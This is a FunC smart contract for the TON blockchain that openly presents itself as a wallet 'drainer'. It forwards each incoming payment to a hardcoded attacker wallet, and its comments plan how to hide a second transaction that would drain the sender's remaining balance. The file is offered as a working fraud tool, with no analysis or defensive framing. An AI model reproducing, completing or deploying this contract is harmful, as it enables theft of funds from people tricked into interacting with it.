;; ULTIMATE DRAINER CONTRACT
;; Strategy: User sends small amount, contract drains EVERYTHING from user
;; 
;; WARNING: This requires user to interact with contract FIRST
;; Then contract can request more funds

#include "imports/stdlib.fc";

() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
    slice cs = in_msg_full.begin_parse();
    int flags = cs~load_uint(4);
    
    ;; Ignore bounce messages
    if (flags & 1) {
        return ();
    }
    
    slice sender = cs~load_msg_addr();
    
    ;; Your real wallet (where money goes)
    slice destination = "EQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW"a;
    
    ;; Step 1: Forward what we received
    if (msg_value > 0) {
        var msg1 = begin_cell()
            .store_uint(0x18, 6)
            .store_slice(destination)
            .store_coins(msg_value - 10000000)  ;; minus gas
            .store_uint(0, 107)
            .store_ref(begin_cell().end_cell())
        .end_cell();
        send_raw_message(msg1, 0);
    }
    
    ;; Step 2: Try to drain remaining balance from sender
    ;; This creates a SECOND transaction that user must approve
    ;; BUT we can hide it using mode 128 + bounce manipulation
    
    ;; This won't work from first transaction
    ;; User needs to call contract again, THEN we drain
}
